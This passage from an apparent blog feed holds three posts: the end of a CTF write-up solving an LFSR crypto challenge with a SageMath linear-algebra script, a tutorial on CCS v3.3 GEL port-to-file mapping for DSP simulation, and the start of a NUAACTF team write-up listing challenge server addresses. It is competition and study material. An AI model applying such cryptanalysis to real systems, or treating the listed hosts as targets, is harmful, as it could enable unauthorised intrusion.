punctuation">:</span>        lastbit<span class="token operator">^</span><span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token operator">&amp;</span><span class="token number">1</span><span class="token punctuation">)</span>        i<span class="token operator">=</span>i<span class="token operator">>></span><span class="token number">1</span>    output<span class="token operator">^</span><span class="token operator">=</span>lastbit    <span class="token keyword">return</span> <span class="token punctuation">(</span>output<span class="token punctuation">,</span>lastbit<span class="token punctuation">)</span></code></pre><p>话说回来，对于这题而言，分析可知，flag 括号内的字符是二进制位数为100位的整数。考虑到这题把 flag 作为 mask 而不是初始的状态 state，且初始 state 是随机给定的整数，LFSR 得到的伪随机序列最大重复周期为 $2^{100}-1$，爆破求解无法解出。</p><p>分析 LFSR 的逻辑可知，lfsr 函数内的输出位 $output bit = m_0x_0 + m_1x_1 + … + m_{99}x_{99}$（模二和），由于这是一个线性的方程，于是可以通过求解100个方程得到对应的系数m，也就得到了 flag。</p><p><strong>Exp</strong></p><pre class=" language-python"><code class="language-python">output <span class="token operator">=</span> <span class="token string">"0100110011101111011111011010100111001010010100001111110110111101011110011111010010010111011100110111011001100001010010011101101000110110000011111011110000010100001001000011001011011011011001111110101111001010011011100010011110101100100101111001011100011110111101001010000000100100000111100101100100100000100110001111110011100110101000110100011001110110000110111111010111000001101110011001101111010110101000101011110111001011001111111000100100100011100100010101001100111011101111100110101011101101001001110010111011010011111001100001111111100001000001101101000001010100110011001101000101001010001001011000010111111100101111000000101000010110100110101001001100100011000111101000110011110101101111100110101010101000000001110010101001001111101001010111011110110001100101001111110111000110101011011010110101100011110010000011000110010111101010010000011101110111100011011110110001111010101011101100101101001111100100011000100101111011110001111100000110111000111111000111100000110011011011111110011111100010010110000010011100001010101011011101100011001100101100011001010010001101010011000000011110110111000000110001010010111110101011100000010100100001101011010101100110000101100010001010010111011000100001000001001110101011000010111000000010101100001010000010110110000111100011011000010111001111101110111010110000011001011101100000100000100010100100000010011010000111110010001111010000100011110000101111000110100010110101110001011101101100111000001110100100000000010011001110101110000001101100000001010111010011111000101101011001010011001101000111000010111111010101000011011001001110000011100100100010110101100001110110111001000001011111100101100011010010010110000011110100110000111011011010101110101001100110100101100101000100011001011000001011110010000011000110111011110011010001101100010010111110101101101110100111010000001101000011011010011110111101000000100011000000101001000000011010101010000100001110110000110011000111101011100100101111101111111110101000011010001101100010010100111000000010000101100100110101000001001011100011111001101001101100010100000111010101111011101111111101100000010000111110011101010100101110100101010100011110100100000111010001000100011010011100010011000001110110100110110010100100110111011001010010010100000110101110000011110010110100010101000110000111101011011010111101100111100101001101001101100111101000100101101100010111010010111100100111101101110101110011010110011111011111010000011000100010010101110001001000111111100100010100000001001010111010100010111001011011101110010110111110110100011111101110111011000111001010010110001001011011100110101111100100000101110000001011110011101110101101001011111100011001100111001011011001011011101000101100100011101000011101011010110010111111010011110111111111100001101101001101101111000100110010010100000100000100110100100110010000100101100000101010101000111110101001111111011011111101101110010100110000010110111001101110011101100001111111001110110010010011101111100111111000010011010010011100000001010011111111110001111110110110110001001001111011001101110110101100011010001111110010001011010000011110101100110010010001110010100010000000010101010010111011010101011011000010010011010110101101011100100101110001100000111110010101100010100010100010000101111000011111000111000011110001110110000011000100110010101111111111100011010000010010010111111110000000010100100101101101010111011000001010000000101011010110011101000110011011001110101101001001101100010011110001101001001000011001101100001101100000101111000001110100001100001000100000000011010011001001011110011000011011000100011011001011100111111000011011010000100000011110110011011110111000001011101101110110101000101011111110000100000111111110011111111100010101001000011010001110111111011100010111001110110001000101010001001001111111110111001101001001000110000110100000000010010100001010111101001110001011101011000100000001001001011111000100011111000011010001110001111111110111100010001110101011101011100010100000011110000100011001100000100111000111011011101000110010011010011110010010000111010001011111111010110011100111011110100111000101100100111001001010001000100011110101100100010000000000110010111101101111101011001101111000000000100000101001011110000010011110011000000100111001001110001000010011111010100001001010010100111111010111001001110110101010010100010010100101100000001010010111101101000110100111110000000111110000011110011001101010111101010111010111010000000110010001011110101110110001000110111101110101101001001100001101110001000100000110100000100000111110010110110010011111100010011111001110111011010101010001011111110000000011110001010011001101010110010101100101100110010111001100100111101000100010100010010100000010010111101100111110101101111101001010110010001111111001101010111110101111001000111101001110100000111111010000111000010101001001101100111001111111111100011010111110001101000100001010000000001101101001110001000001110010000010110001001001101010111111001001010100011011111011000011001001101000110010101000010100001001000011111001101101111011111001000010010111011010110010011010101100100000101100110110011011110000110011000000001011000111100101000011011011010010111000110101110101111100100010101010101000011000111000010001001000100110101111001001001111100110000101100010011101100001000010100010101110001111110101100101000101110000110010100101100101100101100100111111010100101010011100110100011111001000100010001101111111101011110100111001110101001101000010001011000111101110001010100101101111000110101001011101110110110110110101011010001110011111011110011010100110100111111010101111101111100110000110010111110110100110000011110110111111101111010011010000101010111100001111110110000001000001000011101001010010100100100000001101011101110011001011011110010111101111101010011010000110110101000100010110110101101010110110010011010011111111100001001000110111101001111000011001000010111100110001110110011011011100101011010101100011001111111000100000011100110011001001011000100010110000100001100011010000110110011100000111000010001011010001110010101000100010001001110001011001010000111010010101110001010100011101101110010111100010110010000011010111001101000100111011010100001010011100000100001010100010110100111000000001111100000100011100101011011101111111101101110011111010000110111101000001001110111000001000101100110100100111100100011011100010011111101010001101010100101110000110011000100001111100100001000000100011101101011011111000011110010110110101010011101000001111001011100101001001101111000011110000001010011010001110000111001101100011110011001100000111101001011000110111011001101101101100101100110100101011111111110110000111101000000100101011100111001111111011010100110010001000001101010001110010010000101111000001010100000101100000010101110100000000110011001011000011101101000000100111111010111110100011111101100001001110001100101100001010000100000110111101001101010000011100000000100000101101010010101111101100110110111000011100111001010010100101000111011001001110011111100010010010110100111101100110110111001011110010000111011111010101000010001101110011111010110011100010001111111011100110100011110110001101001110001010001110011110101111101011101100000111011011101110000110111101010001000011110011011101100011100101110100000100010110110011010101011000010010110000000100010011001110010011110010110111001111011010101111011000000111110000011011100100010011110010110000001111110111000100111010100110010111100010000110101011110011010110011001011011010010111001000000000001001010101010001100000110111101000000010100100010100101011111110011011100111101001110101010001100000100100110111110001111000011100010110001101101010011001011111101011000110110000111111101100000000001000010010010011101001000111100000010111011011001001100110000101010110001011000001011010111000111100111011010101010011100100100100010000001101001101010111110010100101000001100111110111111110000101111100110001110111010111001111110111100000111011011010111011001111010100010000111011111111000100110110001100000110101000001010010010100111011100000011111110001000010011010101001111010111100011110110110111000000111101010110001100000100001101101001101010111110001101101100101101101001000100000100110111111010011010011111010110110111101001000100010111101100011010111011111010011110000100001100101101111110010101000000101111101000001111110100000001011011111111100100110101101011100101101001011010001100010101101100000101000001110110101010100001011100010000111010011101110000000010000000000010111100111000010000000110110011011101110000001111011100011101111100011000011001000100111010101011010101110011010011011011010100011011000110111101001110011110000100010011000010000001101010010011000111000000000101100011010001000100010100100100011000101110100010001111101001010100001000000110010011101011101000000100010000011010110100111110101110001111001000000101011101010111110110100100011010000011010111111001001111101101110111110111000001010111100010001001001100000000110011100001100100111010011111011001010001101111111000010110101000011100001010110100101110111001001100000000110110101011001110000011001111100001101110100101101111100110001010011011001010110111000100010000110001111101110011100001101000100110000111000110001011011110100010101011011001001111101001110011100001110001010100011001110110101101001101010101001110011110001011101011100100001101100110110110101011101010110011100000001011010111011101000000101110111110010000000000101001110011111011001110001100010111001010010110011100001000011111101111101100111000101011100011000001100000000000010000111111010010101110101011100010100001000000100111111010111110010010111010110010100111000010111100000000100010111010010011010011001100010001000001100110100101110100110110111101010001100001010011111011100000010110110110000000100101100110100101100111001010100010001011010001010011110100110101000110001110000100111111001000110011110010111000110010001111111111101011110100111101001001101110110011111000110010111000011011111001110101101101000011010101011010111101011101111011100101001111111000101100100000011000100101001011001011110001101001100101001"</span>flist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> output<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        f<span class="token punctuation">.</span>append<span class="token punctuation">(</span>int<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>    flist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>f<span class="token punctuation">)</span>C <span class="token operator">=</span> matrix<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> flist<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>F <span class="token operator">=</span> matrix<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> flist<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">)</span>sol <span class="token operator">=</span> F<span class="token punctuation">.</span>solve_left<span class="token punctuation">(</span>C<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> sol<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>int<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>首先提取线性方程<strong>系数矩阵 F</strong> 和<strong>解矩阵 C</strong>，而后利用 <strong>SageMath</strong> 求解方程即可。</p><p>其中的 <code>GF(2)</code>，GF 是 Galois Field 的缩写，中文称其为 Galois域或有限域， <code>GF(2)</code>是最简单的有限域，只有0, 1二元及+（异或运算）、×（与运算），大概可以理解为模二运算吧。</p><p>在线 SageMath： <a href="https://cocalc.com/" target="_blank" rel="noopener">https://cocalc.com/</a></p><p><img src="/2020/08/27/CTF_2020CISCN_preliminary/image-20200821163107265.png" alt="SageMath"></p><p><code>flag{856137228707110492246853478448}</code></p><hr><h2 id="SageMath-Introduction"><a href="#SageMath-Introduction" class="headerlink" title="SageMath Introduction"></a>SageMath Introduction</h2><p>这里顺便来介绍一下 SageMath 这一工具喵！</p><blockquote><p><strong>SageMath</strong> is a free open-source mathematics software system licensed under the GPL. It builds on top of many existing open-source packages: NumPy, SciPy, matplotlib, Sympy, Maxima, GAP, FLINT, R and many more. Access their combined power through a common, Python-based language or directly via interfaces or wrappers.</p><p>Mission: <em>Creating a viable free open source alternative to Magma, Maple, Mathematica and Matlab.</em></p></blockquote><p><strong>SageMath</strong> 是一个基于 GPL 协议的开源数学软件。它<strong>使用 <em>Python</em> 作为通用接口</strong>，将现有的许多开源软件包整合在一起，构建一个统一的计算平台。</p><p>一个数学求解软件，可以解方程啊 balabala，感觉用起来挺爽的。  </p><p><strong>官网：</strong> <a href="https://www.sagemath.org/" target="_blank" rel="noopener">https://www.sagemath.org/</a></p><p><strong>在线版本：</strong> <a href="https://cocalc.com/" target="_blank" rel="noopener">https://cocalc.com/</a></p><p><a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">https://sagecell.sagemath.org/</a></p><br><p>By the way，这个 <a href="https://cocalc.com/" target="_blank" rel="noopener"><strong>CoCalc</strong></a> 能做的不仅仅可以用来跑 SageMath，还有 Jupyter notebook, Linux terminal, X11 desktop, LaTeX document 等等，在线免费用，登录还能保存工作状态，感觉挺实用的呢。</p><p><img src="/2020/08/27/CTF_2020CISCN_preliminary/image-20200830023940598.png" alt="CoCalc"></p><p><img src="/2020/08/27/CTF_2020CISCN_preliminary/image-20200830025835167.png" alt="CoCalc2"></p><hr><h2 id="References-amp-Extensive-Reading"><a href="#References-amp-Extensive-Reading" class="headerlink" title="References &amp; Extensive Reading"></a>References &amp; Extensive Reading</h2><ul><li><a href="https://www.freebuf.com/articles/database/170814.html" target="_blank" rel="noopener">Z3Py在CTF逆向中的运用</a></li><li><a href="https://blog.csdn.net/qq_33438733/article/details/82011892" target="_blank" rel="noopener">Z3 学习笔记</a></li><li><a href="https://xz.aliyun.com/t/3682" target="_blank" rel="noopener">CTF 中的 LFSR</a> </li><li><a href="https://www.anquanke.com/post/id/181811" target="_blank" rel="noopener">深入分析CTF中的LFSR类题目（一）</a></li><li><a href="https://www.anquanke.com/post/id/184828" target="_blank" rel="noopener">深入分析CTF中的LFSR类题目（二）</a></li><li>etc.</li></ul><p>（先溜了</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> Z3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DSP | CCS v3.3 利用I/O端口从外部文件传送数据的相关配置</title>
      <link href="/2020/07/11/Tips_CCS_RWDataFromPort/"/>
      <url>/2020/07/11/Tips_CCS_RWDataFromPort/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>喵呜，不知不觉有一个多月没来写东西了（摊手</p><p>考试月也太难熬了吧<strong><em>（头秃.gif）</em></strong>！<strong>啊啊啊终于过来了！</strong></p><p>每个期末都很难过，但这个期末怕是最难受最焦虑的一个了，主要是一堆事情全堆到了考试月甚至最后的扎堆考试周。五门线上考试有四门是两门两门连着考的，期间还有各种课程的实验（及实验报告）、大作业（及其报告）、结课报告、网课考试，以及零零散散的杂事 balabala。考前赶着 ddl 一天写了两篇半报告，然后挤着时间疯狂 <del>复</del> 预习考试课程，人都要没了……</p><p>这学期选了一门 <strong>DSP 原理与应用</strong> 选修课，亲身感受证明这门课太难了，唉，<del>后悔没退掉哭唧唧。</del> 这个大作业太难做了呀！之前折腾了好久做不出来，拖着拖着就有点佛系了（（</p><p>做这个 DSP 大作业需要用到 CCS 软件，就是辣个 TI 出的 <a href="https://www.ti.com.cn/tool/cn/CCSTUDIO" target="_blank" rel="noopener">Code Composer Studio 集成开发环境 (IDE)</a>，然而是用<strong>古老的 v3.3 版本！</strong>据老师是因为用到的是 DSP 型号为 TMS320C54x 系列，而这个系列只有在这一版本上才有支持。啊是挺古老的了。</p><p>去官网看了看，现在最新的是 11 Jun 2020 发布的 10.1.0.00010。</p><p>又去翻了翻 <a href="http://software-dl.ti.com/ccs/esd/documents/ccs_downloads.html" target="_blank" rel="noopener">CCS 版本历史页面</a>，拉到最下面才找到了 V3.3 版本，佛了，CCSv4.0.x是2009年发布的，那 v3.3 岂不是更古老……</p><p><img src="/2020/07/11/Tips_CCS_RWDataFromPort/image-20200712002124213.png" alt="Version3"></p><p>据说这个软件只支持 32 位操作系统，于是先在虚拟机里整了个 Windows 7 32bit 系统，然后才装上这古董 emmm。</p><p>而对于<strong>利用 Simulator 的 I/O 端口从外部文件传送数据的方法</strong>，查了各种资料几乎没有相关介绍，最后是在老师和小伙伴的指导和提示下，才实现了这一操作。</p><p>那正好就来记录一下吧，希望对学弟学妹们有点帮助<em>（如果看到的话）</em>，也对想要从事相关研究的读者有所启发。</p><hr><br><h2 id="方法介绍"><a href="#方法介绍" class="headerlink" title="方法介绍"></a>方法介绍</h2><p>再扯几句吧。首先是把教材上关于 CCS 使用的介绍过了一遍。</p><p>教材第三版：balabala 详见 4.7.3 小节，然而并没有这一节（估计再版的时候没改）。</p><p>翻出第一版电子版，傻了，2001年的版本，那时候还没用 CCS，是用命令行模拟的……</p><p>网上找了各种资料，也没具体介绍，要不然就是利用 C语言（而不是汇编）来编写的代码，这个导入数据的方法又不一样，是在C语言中相应的语句打上断点，而后修改断点的条件为读取/写入数据来实现的。</p><p>看了一遍暑假要补做的 DSP 实验的指导书，貌似介绍的是更古老的 CCS 2.x 版本，这个版本又不一样，试了但数据并没有成功输入，又怀疑是输入文件格式的问题。<br>……</p><p>到了最后，在小伙伴提示下，找到了老师在群里发的拍的几页课本。才知道原来是第二版课本的 4.7.3 小节里做了介绍……（头秃</p><p>其实就是<strong>将 I/O 口的地址与外部的数据文件相关联</strong>。参考第二版课本，具体的实现的步骤如下。</p><h3 id="Step-1-修改-GEL-文件"><a href="#Step-1-修改-GEL-文件" class="headerlink" title="Step 1 修改 GEL 文件"></a>Step 1 修改 GEL 文件</h3><blockquote><p>CCS 的 GEL 语言（通用扩展语言）是一种交互式的命令，它是解释执行的，即不能被编译成可执行文件。它的作用在于扩展了 CCS 的功能，可以用 GEL 来调用一些菜单命令，对DSP的存储器进行初始化配置等。 </p></blockquote><p>通过修改 GEL文件，<strong>定义 I/O 端口地址映像</strong>。</p><p>在初始化过程中<strong>将输出端口 PA0 映射到 0x0000，将输入端口 PA1 映射到 0x0001</strong>。</p><p>即在 <code>C5402_Init()</code> 函数中加入下面的语句。</p><pre class=" language-c"><code class="language-c"><span class="token function">GEL_MapAdd</span><span class="token punctuation">(</span><span class="token number">0x0001</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* I/O Read */</span><span class="token function">GEL_MapAdd</span><span class="token punctuation">(</span><span class="token number">0x0000</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* I/O Write */</span></code></pre><blockquote><p>具体含义是</p><p><strong>GEL_MapAdd(address, page, length, readable, writeable);</strong></p><p>address    端口地址值。</p><p>page    存储空间值。0：程序空间，1：数据空间，2：I/O 空间。</p><p>length    地址空间长度。对于 I/O 端口一般取为1。</p><p>readable    可读标志。1可读，0不可读。</p><p>writeable    可写标志。1可写，0不可写。</p></blockquote><p>修改后的结果如图所示。</p><p><img src="/2020/07/11/Tips_CCS_RWDataFromPort/image-20200712011437886.png" alt="gel"></p><p><img src="/2020/07/11/Tips_CCS_RWDataFromPort/image-20200712003700513.png" alt="gel2"></p><h3 id="Step-2-Reload-GEL-File"><a href="#Step-2-Reload-GEL-File" class="headerlink" title="Step 2 Reload GEL File"></a>Step 2 Reload GEL File</h3><p>请注意，一定要<strong>重新加载 GEL 配置文件</strong>，否则这个配置是不生效的。<em>（这里有一个掉坑里的</em></p><p>具体方法就是在左边的文件列表里这个 gel 文件上右键，点击 Reload 即可。</p><p>当然，还有另一种方法，那就是<strong>重启 CCS 软件</strong>。实在不行<strong>重启系统</strong>也行 23333.</p><p>（重启解决绝大部分问题呢！</p><h3 id="Step-3-Port-Connect"><a href="#Step-3-Port-Connect" class="headerlink" title="Step 3 Port Connect"></a>Step 3 Port Connect</h3><p>点击菜单栏下的 Tools - Port Connect。建立端口与文件之间的连接。</p><p><img src="/2020/07/11/Tips_CCS_RWDataFromPort/image-20200712005647785.png" alt="PortConnect"></p><p>端口设置如下。</p><p><img src="/2020/07/11/Tips_CCS_RWDataFromPort/image-20200712005859001.png" alt="connect"></p><p><code>Port</code> 即在 Step 1 中设置的端口，0x01 为输入端口，0x00 为输出端口。<code>Type</code>也相应设置。</p><p><code>Length</code> 设置为1。</p><p><code>Page</code> 设置为 I/O。</p><p>点击<code>OK</code>之后会弹出文件选择窗口，选择你要导入/导出数据的文件即可啦！</p><p>噢对了，这里提一句，这个文件的格式是每行一个十六进制的数据，数据长度为16位，不带前导符<code>0x</code>，即形式为 <code>xxxx</code>，<code>x</code>为 0-F 之间的数。例如下图所示。</p><p><img src="/2020/07/11/Tips_CCS_RWDataFromPort/image-20200712010628380.png" alt="file format"></p><p><strong>这个格式与利用断点输入输出数据的格式不同，要注意一下！</strong>（那个是首行有格式标识的，1651 balabala）</p><h3 id="Step-4-确认连接"><a href="#Step-4-确认连接" class="headerlink" title="Step 4 确认连接"></a>Step 4 确认连接</h3><p>在下方会有一个新的窗口，配置好后的状态如下图所示。</p><p><img src="/2020/07/11/Tips_CCS_RWDataFromPort/image-20200712011153456.png" alt="port"></p><p>可以通过 Connect 和 Disconnect 按钮来建立/取消端口连接。</p><p>要注意的是，这个写入的文件，在断开连接之前，都是一直被 CCS 占用着的，而且并没有实时写入文件！</p><p>（盲猜可能在输出缓存中？占用了文件句柄但没有 flush？）</p><p>因此要想看到结果的话一种方法是断开输出文件，另一种方法，关掉 CCS（简单粗暴。</p><h3 id="Step-5-在汇编中使用端口"><a href="#Step-5-在汇编中使用端口" class="headerlink" title="Step 5 在汇编中使用端口"></a>Step 5 在汇编中使用端口</h3><p>首先定义输入输出端口如下。</p><pre class=" language-asm"><code class="language-asm">PA0 .set 0 ;0口 输出 PA1 .set 1 ;1口 输入</code></pre><p>而后结合 PORTR、PORTW 等命令使用端口即可。</p><pre class=" language-asm"><code class="language-asm">PORTR PA1,@xPORTW @y,PA0</code></pre><p>好了，大概就这些了喵~</p><hr><h2 id="一种简化方法"><a href="#一种简化方法" class="headerlink" title="一种简化方法"></a>一种简化方法</h2><p>噢对了，书上还给出了一种替代方案，可以简化前述方法的 Step 3.</p><p>就是<strong>在 GEL 文件初始化函数中再加入下面的语句</strong>，直接建立端口的连接。</p><pre class=" language-c"><code class="language-c"><span class="token function">GEL_PortConnect</span><span class="token punctuation">(</span><span class="token number">0x0001</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token string">"C:\\ti\\C54x\\in.dat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">GEL_PortConnect</span><span class="token punctuation">(</span><span class="token number">0x0000</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token string">"C:\\ti\\C54x\\out.dat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><blockquote><p>具体含义是</p><p><strong>GEL_PortConnect(portAddress, page, length, accessType, fileName);</strong></p><p>portAddress    端口地址值。</p><p>page    存储空间值。0：程序空间，1：数据空间，2：I/O 空间。</p><p>length    地址空间长度。对于 I/O 端口一般取为1。</p><p>accessType    存取类型。1为读取（输入），2为写入（输出）。</p><p>fileName    外部数据文件名。注意是绝对地址，目录要用双斜杠。</p></blockquote><p>（不过这个办法我也没试过，不清楚怎么样喵</p><p>（也就是简化了那个端口连接的操作而已啦</p><hr><h2 id="其他一些-tips"><a href="#其他一些-tips" class="headerlink" title="其他一些 tips"></a>其他一些 tips</h2><p>也算是琢磨出来的/调教出来的一些经验吧……头秃。</p><ol><li><p>每次修改汇编程序，Rebuild 之后，都要记得 Reload Program（当然第一次跑程序的话就是 Load Program 了2333），将输出的 out 文件加载到 Simulator 中进行仿真调试。</p></li><li><p>画图的时候，每运行完一遍程序，都要重新启动（Restart），不然啥也没有变化，或者会出现奇奇怪怪的东西，当然也有可能是代码设计上的问题了。</p></li><li><p>画图的话必须要在停下来（halt）的时候才能绘制，不然没变化。这里可以在程序中加入断点来实现。我建议的话还可以在输出数据的位置打个断点，然后选项选择更新所有窗口（Update all windows），还是叫 Refresh Window 来着，感觉上是有用的可行的。而后在最后程序结束死循环那里再打一个断点，这样运行程序的时候，就会自动在结束时停下，把图画出来了！<em>（当然玄学情况就不好说了23333）</em></p></li><li><p>……</p></li></ol><p>反正经常 Reload 就完事了 hhhhh。</p><p>这个版本的软件给我的感觉就是，功能实现的设计上十分不友好，用户体验就感觉挺蠢的。</p><p>不过毕竟是多古老的版本呢！</p><p>BTW，之前还用过 CCS v9.x 版本开发 MSP432 之类的 MCU，当时用C语言开发，主要是 MCU 函数接口的资料比较少，只有官方英文文档，那时网上还没有多少关于那款 MCU 的使用经验（现在不清楚了），就比较难受，但相比而言软件使用感觉上就好多了。可能是新版本换了基于 <em>Eclipse</em> 开源软件框架来做界面的原因吧 23333333。</p><p>就这样吧。</p><p>（溜了喵~</p><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.ti.com.cn/tool/cn/CCSTUDIO" target="_blank" rel="noopener">Code Composer Studio 集成开发环境 (IDE)</a>（TI 官网）</p><p>戴明桢, 周建江. TMS320C54x DSP 结构、原理及应用(第2版)[M]. 北京:北京航空航天大学出版社.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Configuration </tag>
            
            <tag> tips </tag>
            
            <tag> DSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 NUAACTF 吸喵喵队 Writeup</title>
      <link href="/2020/05/30/CTF_2020NUAACTF/"/>
      <url>/2020/05/30/CTF_2020NUAACTF/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p><strong>吸喵喵，冲冲冲！</strong></p><p>期待已久的 2020 NUAACTF 终于来了呀！</p><p>玩(头)耍(秃)了一个下午，整体而言感觉上<strong>难度雨露均沾</strong>，然而挺茫然的。</p><p>最后终于冲到了校内第二，感觉好棒啊！</p><p>这篇 Writeup 是由吸喵喵队共同完成的，我主要看的是 Misc、Crypto、Reverse（反正就随缘看2333），俩队友 @Noname 和 @Sophia 打 Web 和 Pwn，都挺辛苦的。</p><p>在此基础上我加了点自己的感受什么的吧。</p><p><em>之后复现的时候再加点东西吧（咕。</em></p><h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><p><img src="/2020/05/30/CTF_2020NUAACTF/RankingListTotal.png" alt="全部榜单"></p><p><img src="/2020/05/30/CTF_2020NUAACTF/upload_50cd0a2a5971518f93ae8269000afabf.png" alt="校内榜单"></p><p>上面是 不分/分 校内外 的部分榜单。</p><p>校外选手太强了啊啊啊啊！（太阔怕了嘤嘤嘤）</p><p>校内还算友好，但最后一个小时惊心动魄，排名在2-4位之间波动。</p><p>最后几分钟队友冲了一波 pwn，冲到了第二，太棒了！</p><p>比赛开始一个小时还没恰饭，那时候看了看放出来的题，马上有思路能做的都差不多了，然后就去恰了个饭。</p><p>回来到比赛结束这中间几个小时，<strong>真 的 头 秃</strong>，又困又累又无助，就是好多题看上去能做但做不出 flag 那种……顺手打开了音乐舒缓一下心情。</p><p><img src="/2020/05/30/CTF_2020NUAACTF/upload_7cb6ec474349e2e415bb5eb411fbf1bf.png" alt="吸喵喵"></p><hr><h2 id="平台信息"><a href="#平台信息" class="headerlink" title="平台信息"></a>平台信息</h2><p><a href="http://47.102.118.76:8000" target="_blank" rel="noopener">http://47.102.118.76:8000</a></p><p>部分题目环境信息：</p><blockquote><p>web1 checkin:<br><a href="http://139.9.221.0:8086/" target="_blank" rel="noopener">http://139.9.221.0:8086/</a> 已部署</p><p>web2 jwt :<br><a href="http://139.9.221.0:8090/" target="_blank" rel="noopener">http://139.9.221.0:8090/</a> 已部署</p><p>web3 easypop<br><a href="http://139.9.221.0:8088/" target="_blank" rel="noopener">http://139.9.221.0:8088/</a> 已部署</p><p>web4 command inj:<br><a href="http://139.9.221.0:8092/" target="_blank" rel="noopener">http://139.9.221.0:8092/</a> 已部署</p><p>web5-escape<br><a href="http://139.9.221.0:8094/" target="_blank" rel="noopener">http://139.9.221.0:8094/</a> 已部署</p><p>misc3-babyhttp 已部署<br>106.14.153.173 8443</p><p>pwn1-first-pwn<br>49.235.243.206 10501<br><a href="https://share.weiyun.com/qoaVHGg8" target="_blank" rel="noopener">https://share.weiyun.com/qoaVHGg8</a></p><p>pwn2-baby-format<br>49.235.243.206 10502<br><a href="https://share.weiyun.com/efHNDo4X" target="_blank" rel="noopener">https://share.weiyun.com/efHNDo4X</a></p><p>pwn3-baby-rop<br>49.235.243.206 10503<br><a href="https://share.weiyun.com/gwHWgypr" target="_blank" rel="noopener">https://share.weiyun.com/gwHWgypr</a></p><p>pwn4-easy-heap<br>49.235.243.206 10504<br><a href="https://share.weiyun.com/uh36Y68j" target="_blank" rel="noopener">https://share.weiyun.com/uh36Y68j</a></p><p>pwn5-easy-format<br>49.235.243.206 10505<br><a href="https://share.weiyun.com/0zDGYyYw" target="_blank" rel="noopener">https://share.weiyun.com/0zDGYyYw</a></p><p>pwn6-baby-shellcode<br>49.235.243.206 10506<br><a href="https://share.weiyun.com/HLUP79Fs" target="_blank" rel="noopener">https://share.weiyun.com/HLUP79Fs</a></p></blockquote><p>官方源码 GitHub 仓库<a href="https://github.com/Kit4y/2020-NUAACTF-SZCup" target="_blank" rel="noopener">在这里</a>。</p><br><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web1-checkin"><a 